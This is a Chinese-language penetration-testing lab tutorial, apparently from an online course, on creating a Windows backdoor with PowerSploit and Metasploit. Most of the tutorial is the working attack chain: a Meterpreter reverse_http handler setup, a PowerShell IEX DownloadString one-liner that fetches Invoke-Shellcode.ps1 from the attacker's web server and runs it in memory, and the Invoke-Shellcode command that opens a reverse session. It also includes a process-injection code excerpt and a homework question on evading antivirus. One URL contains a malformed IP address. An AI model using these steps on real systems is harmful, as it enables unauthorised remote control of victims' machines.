# PowerSploit 创建 Windows 后门

## 一、实验简介

### 1.1 实验介绍

一般情况下，攻击者通过后门程序控制目标主机靶机后，目标靶机和攻击者主机之间会建立起一个会话通道，从而让攻击者达到控制目标靶机的目的。后门通道的建立，通常情况下也是为了方便后续持续地访问目标靶机。

本实验将主要介绍使用 PowerSploit 创建 Windows 后门。PowerSploit 是一组有 PowerShell 实现的与安全相关的模块。PowerShell 早已在 BT 和 Kali 中存在，而且被 SET 之类的工具使用，它包含了很多 Windows 环境中及其有用的渗透功能。

由于实验楼提供的实验环境中缺少 Windows 虚拟机，所以无法验证攻击的有效性。本实验将主要介绍 PowerSploit 创建 Windows 后门的这一过程，并讲述其如何感染目标主机，进而与攻击者的主机建立后门连接。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

### 1.2 主要知识点

本实验的所有操作均基于 Linux 操作系统下进行，完成实验需要掌握一定的 Linux 操作系统基础知识。并且需要对 Kali 以及 Msfconsole 常规的攻击流程有一定的了解。本门课程的主要知识点归纳如下：

- Linux 操作系统基础操作知识
- Msfconsole 主要攻击流程
- PowerSploit 创建 Windows 后门的技术支持
- Windows 下载木马文件后的操作流程

### 1.3 实验环境

本实验实验环境由实验楼提供，所有的操作均在 Linux 下进行，实验楼的宿主机为 Ubuntu 14.04，宿主机上安装有两台虚拟主机。两台虚拟主机分别为 Kali Linux 操作系统和 Metasploitable2。

在本次实验中，我们仅仅使用 Kali Linux 操作系统中的 PowerSploit 进行 Windows 后门的创建，不会使用 Metasploitable2。由于实验环境中缺少 Windows 主机，所以 Windows 下的木马与主机连接将使用其他方式演示。

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482369801448.png-wm)

> 图片引自：http://null-byte.wonderhowto.com

## 二、启动环境

## 2.1 启动实验环境

本实验由为 PowerSploit 创建 Windows 后门实验，需要用到两台主机。攻击者使用的主机为 Kali Linux 操作系统，目标靶机为 Windows 操作系统。由于缺少 Windows 目标靶机，所以主要讲解 Kali Linux 上的操作部分。

首先在实验楼环境中，打开宿主主机的命令行终端，并输入如下启动命令。其中值得注意的是，在输入启动命令的时候，一定要注意，`root@Kali` 中的 K 是`大写`的 K：

```
# 开启 Kali 虚拟机
sudo virsh start Kali

# 注意，Kali 中 K 为大写字母
ssh root@Kali
```

**注意：等 Kali 启动，输入命令后，需要启动时间，所以要等待一段时间，再对 Kali 进行连接，否则会报错。**

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101382249.png-wm)

虚拟机 kali Linux 操作系统中的用户 `Kali` 的登录密码为 `toor`，登录成功后，会见到如图所示：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101646711.png-wm)

## 三、原理介绍

### 3.1 PowerSploit 是什么？

PowerSploit 是一款 Post Exploitation 相关工具，Post Exploitation 是老外渗透测试标准里面的东西，就是获取 Shell 之后干的一些事情。PowerSploit 其实就是一些 PowerShell 脚本。

其中包括 Inject-Dll 即注入 Dll 到指定进程、Inject-Shellcode 注入 Shellcode 到执行进程、Encrypt-Script 文本或脚本加密、Get-GPPPassword 通过 Groups.xml 获取明文密码 、Invoke-ReverseDnsLookup 扫描 DNS PTR 记录。

上面的名词众多，必须要掌握的概念为 `PowerShell`。PowerShell 是运行在 Windows 机器上实现系统和应用程序管理自动化的命令行脚本环境。 相比 Linux 里的 Shell，Windows 自带的 cmd 命令提示符显得有些简陋，所以从 Windows 7 之后微软提供了 cmd 的超级升级版，也就是 PowerShell。

### 3.2 PowerSploit 如何工作？

Windows PowerShell 是以.NET Framework 技术为基础，并且与现有的 WSH 保持向后兼容，因此它的脚本程序不仅能访问 .NET CLR，也能使用现有的 COM 技术。

同时也包含了数种系统管理工具、简易且一致的语法，提升管理者处理，常见如登录数据库、WMI。Exchange Server 2007 以及 System Center Operations Manager 2007 等服务器软件都将内置 Windows PowerShell。

UNIX 系统一直有着功能强大的壳程序（shell），Windows PowerShell 的诞生就是要提供功能相当于 UNIX 系统的命令行壳程序，例如：sh、bash 或 csh，许多脚本语言以及辅助脚本程序的工具也已经内置其中。

PowerSploit 通过与 Kali Linux 中的 Msfconsole 一起结合使用，目标主机下载了相应的后门文件后，攻击者使用 Msfconsole 进行监听，通过目标靶机上的后门文件得到一个会话通道，从而建立起攻击机和目标靶机两者间的联系。

## 四、过程实现

### 4.1 PowerSploit 的使用过程

PowerSploit 使用并没有太大的难度，只要熟悉 Linux 的 Shell 就可以快速上手。在进行下面的实验之前，请确保已经弄清楚本实验中的 `3.1 PowerSploit 是什么` 和 `3.2 PowerSploit 如何工作` 这两小节中的概念。

接下来将讲解如何在 Kali Linux 中使用 Msfconsole 结合 PowerSploit 创建 Windows 后门。首先在命令行终端中，输入如下命令进入到 PowerSploit 的脚本文件夹：

```
# 进入到脚本所在的文件夹
cd /usr/share/powersploit
```
![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482385621301.png-wm)


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482386028079.png-wm)

在实验楼中，Kali Linux 虚拟机的 IP 地址可以通过命令 `ifconfig` 查看，由图可以知道攻击机 Kali Linux 操作系统的 IP 地址为 `192.168.122.101`。接下来在 Kali 的命令终端中输入如下命令，启动 Web 服务。其中 SimpleHTTPServer 是一个 Python 模块，它的作用是让你瞬间创建一个 Web 服务器或服务在一个单元文件：

```
# 确保在 /usr/share/powersploit 这个文件夹下
# 启动 Web 服务器
python -m SimpleHTTPServer
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482387082115.png-wm)

在开启了 Python 创建的简单 Web 服务器之后，我们再打开 Kali Linux 下的 Msfconsole 终端，输入如下命令启动 Msfconsole 终端，并且对相应的攻击模块进行配置：

```
# 选用相应模块
# 设置 windows 下辅助模块
# 设置攻击者的主机 IP 地址
# 设置攻击者监听的端口命令
# 输入攻击命令

msf > use exploit/multi/handler
msf > set PAYLOAD windows/meterpreter/reverse_http
msf > set LHOST 192.168.122.101
msf > set LPORT 4444
msf > exploit
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482390669986.png-wm)

**由于实验楼环境中并未安装 Windows 虚拟机，所以无法验证实验的有效性。对于完整版的本地演示，可以查看第 4.2 节中 本地 Kali Linux 演示完整版（选看） **

如果有 Windows 系统，则下一步是运行 PowerShell 这个工具。在 PowerShell 这个命令行中输入命令，注意，其中的 IP 地址需要换成攻击者主机的 IP 地址：

```
# 下载脚本文件
ps > IEX (New-Object Net.WebClient).DownloadString ("http://192.168.192.122.101:8000/CodeExecution/Invoke-Shellcode.ps1 ")
```
即下载服务器 Web 服务网页上的 `Invoke-Shellcode.ps1` 文件：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482390958591.png-wm)

接着继续在 Windows 的 PowerShell 中上运行如下命令，创建会话通道：

```
# 创建 session 会话通道
ps > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.122.101 -lport 4444 -Force
```
如果一切顺利，在输入完上述命令之后，处在监听状态的 Kali Linux 中的 Msfconsole 已经建立了一个会话通道。其中 `Invoke-Shellcode.ps1` 源码的关键部分为：

```
...
...
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    
    # 进程的 ID 编号变量
    $ProcessID,
    
    # 参数 RunLocal 默认本地运行
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Switch]
    $Force = $False
)
...
...
# 函数远程注入函数关键部分
function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # 打开一个句柄选择你想注入的进程，ProcessAccessFlags.All (0x001F0FFF)
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) 
        
        # 判断上打开句柄是否成功，进程是否为空
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }
        ...
        ...
    }
```

### 4.2 本地 Kali Linux 演示完整版（选看）

步骤和在实验楼操作的一样，先使用 python 启动 Web 网页服务：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482393737397.png-wm)


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482395399204.png-wm)


接着再打开新的命令行终端，输入命令 `msfconsole` 打开 `Msfconsole`，设置 `PAYLOAD` 以及本地主机 IP 地址 `LHOST` 和本地主机端口号 `LPORT`。最后输入攻击命令 `exploit`，监听目标主机。箭头所指的地方需要替换成攻击者电脑的 IP 地址，由 `ifconfig` 命令可以查看本机 ip 地址。 

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482393380008.png-wm)

```
# 下载脚本文件
ps > IEX (New-Object Net.WebClient).DownloadString ("http://192.168.192.122.101:8000/CodeExecution/Invoke-Shellcode.ps1 ")
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482395671440.png-wm)

```
# 创建 session 会话通道
ps > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.122.101 -lport 4444 -Force
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482396010425.png-wm)

PowerSploit 创建 Windows 后门在 Windows 下的两条重要命令如上图所示，第一条命令会创建一个 .Net WebClient Object 用来下载工具，并把它传到 Invoke-Expression 用来将工具映射到内存。第二条命令用于监听者调用 Invoke-Shellcode 工具，创建会话通道。

**`注意：`其中 Windows 下的攻击者的 IP 地址要填写正确，Linux 本机的 IP 地址，可以通过 ifconfig 命令进行查看。**

## 五、总结和思考

### 5.1 总结和思考

后门的建立是为了方便攻击者后续访问目标靶机，在上述实验中主要介绍了 PowerSploit 创建 Windows 后门的过程，并结合 Msfconsole 对目标主机进行监听。

由选看部分可以知道，当入侵目标主机后，攻击者通过在目标靶机下的 PowerShell 操作，下载相应的后门文件，由 Windows 的 PowerShell 工具与攻击机建立起连接，留下后门程序，从而达到持续访问的目的。

本文介绍的 PowerSploit 创建 Windows 后门主要文章结构为：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1482803879095.png-wm)

## 六、课后作业

### 6.1 课后作业

后门木马的创建有多种多样的方式，要么是利用攻击机管理员主动下载木马文件，要么就是在渗透成功后，通过上传木马文件到已经渗透成功的目标主机，从而感染目标主机。

无论哪种方式，本质上都是建立攻击机和目标靶机两者之间的联系，让攻击者能够获取目标靶机的管理权限，达到直接或者间接控制目标靶机的目的。

学习了本课程之后，请同学们思考如下问题：
- 常见的木马后门有哪些？
- 木马文件如何进行免杀，提高生存率？